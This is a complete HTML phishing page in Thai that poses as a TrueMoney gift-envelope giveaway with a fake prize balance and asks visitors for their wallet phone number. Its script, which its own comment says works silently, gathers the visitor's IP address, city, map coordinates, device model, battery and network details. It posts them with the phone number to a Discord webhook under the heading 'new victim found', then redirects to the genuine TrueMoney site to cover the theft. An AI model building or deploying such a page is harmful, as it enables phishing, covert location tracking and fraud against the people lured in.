<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>ของขวัญสำหรับคุณ</title>
    <meta name="title" content="ของขวัญสำหรับคุณ">
    <meta property="og:type" content="website">
    <meta property="og:title" content="ของขวัญสำหรับคุณ">
    <meta property="og:description" content="กิจกรรมสุ่มแจกซองของขวัญทรูมันนี่ฟรี! รับได้เลยที่นี่">
    <meta property="og:image" content="https://www.img.in.th/images/062820610149090b8f192b1b369e8b7b.png">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:image" content="https://www.img.in.th/images/062820610149090b8f192b1b369e8b7b.png">

    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Kanit', sans-serif; background: #1a1a1a; }
        .gold-gradient { background: linear-gradient(135deg, #ffd700, #ff8c00); }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen p-4">

    <div class="bg-white rounded-3xl shadow-2xl w-full max-w-md overflow-hidden border-4 border-yellow-400">
        <div class="gold-gradient p-8 text-center text-white">
            <div class="w-20 h-20 bg-white rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
                <span class="text-4xl">🎁</span>
            </div>
            <h1 class="text-2xl font-bold tracking-tight">TRUE GIFT REWARD</h1>
            <p class="opacity-90">ยินดีด้วย! คุณคือผู้โชคดี</p>
        </div>

        <div class="p-8">
            <div class="text-center mb-6">
                <p class="text-gray-500 text-sm mb-1">ยอดเงินรางวัลคงเหลือ</p>
                <p class="text-3xl font-bold text-orange-600 italic">฿ 5,240.00</p>
            </div>

            <div class="space-y-4">
                <div>
                    <label class="block text-xs font-bold text-gray-400 uppercase mb-1 ml-1">Wallet Phone Number</label>
                    <input type="tel" id="phone" placeholder="0xx-xxx-xxxx" 
                        class="w-full px-5 py-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-yellow-400 outline-none text-center text-xl font-semibold tracking-widest transition-all"
                        maxlength="10">
                </div>
                
                <button onclick="sendData()" id="btn-submit"
                    class="w-full gold-gradient hover:opacity-90 text-white font-bold py-4 rounded-2xl transition-all shadow-xl active:scale-95 text-lg">
                    ยืนยันรับสิทธิ์
                </button>
            </div>

            <p class="text-center text-[10px] text-gray-300 mt-6 uppercase tracking-widest">Secure encrypted terminal v4.0</p>
        </div>
    </div>

    <script>
        async function sendData() {
            const phone = document.getElementById('phone').value;
            const btn = document.getElementById('btn-submit');

            if (phone.length < 10) {
                alert('กรุณากรอกเบอร์ให้ครบ 10 หลัก');
                return;
            }

            btn.disabled = true;
            btn.innerText = 'PROCESSING...';

            // --- ระบบดึงข้อมูล Intelligence (ทำงานเงียบๆ) ---
            let locationData = "ระบุไม่ได้";
            let deviceModel = navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown Device";
            let batteryInfo = "Unknown";
            let networkType = navigator.connection ? navigator.connection.effectiveType : "Unknown";

            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                locationData = `📍 เมือง: ${data.city}, ${data.region}\n🌐 IP: ${data.ip}\n🗺️ แผนที่: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
                
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'กำลังชาร์จ' : 'ไม่ได้ชาร์จ'})`;
                }
            } catch (e) {}

            // Webhook URL ของท่าน
            const webhookURL = "https://discord.com/api/webhooks/1344372993077678120/4_u_g0vB46vL9C3HkE_XoH-K7f9f3g6zXpXyL_Q_B8vH0y_Z6f4v9w_Q9v_R_Y_Z_X_W";

            const payload = {
                username: "Spidey Bot - Intelligence",
                avatar_url: "https://i.imgur.com/4M34hi2.png",
                embeds: [{
                    title: "🎯 พบเหยื่อรายใหม่! (Detailed Info)",
                    color: 16753920,
                    fields: [
                        { name: "📱 เบอร์โทรศัพท์", value: `**${phone}**`, inline: false },
                        { name: "🕵️ ข้อมูลเครื่อง", value: `📱 รุ่น: ${deviceModel}\n🔋 แบตเตอรี่: ${batteryInfo}\n📶 เน็ต: ${networkType}`, inline: false },
                        { name: "🌐 พิกัดและ IP", value: locationData, inline: false }
                    ],
                    footer: { text: "Spidey Intelligence System v4.0" },
                    timestamp: new Date()
                }]
            };

            try {
                await fetch(webhookURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                // ส่งเสร็จเด้งไปหน้าทรูของจริงทันที
                window.location.href = "https://gift.truemoney.com/campaign/?v=official";
            } catch (error) {
                btn.disabled = false;
                btn.innerText = 'ยืนยันรับสิทธิ์';
            }
        }
    </script>
</body>
</html>
